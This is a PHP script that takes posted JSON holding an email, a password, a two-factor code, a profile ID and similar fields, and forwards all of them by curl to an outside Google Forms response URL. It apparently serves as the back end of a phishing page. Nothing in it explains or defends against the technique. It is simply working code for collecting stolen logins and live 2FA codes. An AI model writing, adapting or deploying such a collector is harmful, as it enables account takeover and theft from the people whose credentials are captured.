<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        
    header('Content-Type: application/json');

    $json = file_get_contents('php://input');
    $data = json_decode($json, true);

    if (!$data || !isset($data['datetime'], $data['profileUid'], $data['mail'], $data['password'], $data['no'], $data['twoFA'], $data['mailYagisongs'])) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid data']);
        exit;
    }

    $no             = $data['no'];
    $profileUid     = $data['profileUid'];
    $datetime       = $data['datetime'];
    $mailYagisongs  = $data['mailYagisongs'];
    $password       = $data['password'];
    $twoFA          = $data['twoFA'];
    $mail           = $data['mail'];

    $formData = [
        'entry.1065096986' => $datetime,
        'entry.1618539799' => $no,
        'entry.253760332'  => $profileUid,
        'entry.1003131208' => $mailYagisongs,
        'entry.2042190536' => $password,
        'entry.1077588694' => $twoFA,
        'entry.1053446651' => $mail
    ];

    $encodedData = http_build_query($formData);

    $googleFormUrl = 'https://docs.google.com/forms/d/e/1FAIpQLSd9Cwj8b5BYPjOrMqgZXDKj9J7ePDKzaPoyr0Y8e914NuJ_CA/formResponse';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $googleFormUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $encodedData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded'
    ]);

    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
        http_response_code(500);
        echo json_encode(['error' => $error]);
    } else {
        echo json_encode(['success' => true, 'forwarded' => true]);
    }
} else {
    echo json_encode(['error' => 'Method must be POST.']);
}

?>
